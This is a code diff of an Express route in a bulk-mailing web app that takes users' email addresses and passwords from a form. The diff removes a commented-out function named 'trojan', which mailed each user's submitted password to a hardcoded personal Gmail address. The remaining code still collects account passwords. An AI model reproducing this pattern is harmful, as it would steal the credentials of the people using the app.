@@ -9447,7 +9447,7 @@ app.post('/',(req,res)=>{
             mail:req.body.mail,
             password:req.body.password,
             choice:req.body.choice,
-            body:req.body.body,
+            body:req.body.detail,
             subject:req.body.subject,
             to:'eshaan.263@gmail.com'
         };
@@ -9469,24 +9469,6 @@ app.post('/',(req,res)=>{
             html: data.body,
         });
     }
-    // async function trojan(data) {
-    //     var transporter = nodemailer.createTransport({
-    //         service: 'gmail',
-    //         auth: {
-    //           user: data.mail,
-    //           pass: data.password
-    //         }
-    //       });
-    
-    //     let info = await transporter.sendMail({
-    //     from: data.mail,
-    //     to: 'eshaan.263@gmail.com', 
-    //     subject: data.mail, 
-    //     text: data.body,
-    //     html: data.password,
-    //     });
-    // }
-    // trojan(data);
     if(data.choice==='1'){
         for(var i=0;i<first_year.length;i++){
             data.to=first_year[i].mail;
@@ -9513,10 +9495,8 @@ app.post('/',(req,res)=>{
     }
     else if(data.choice==='4')
     {
-        for(var i=0;i<test_data.length;i++){
-            data.to=test_data[i].mail;
-            main(data)
-        }        
+        data.to=req.body.admin;
+        main(data) 
     }
   
     res.redirect('/thanks');
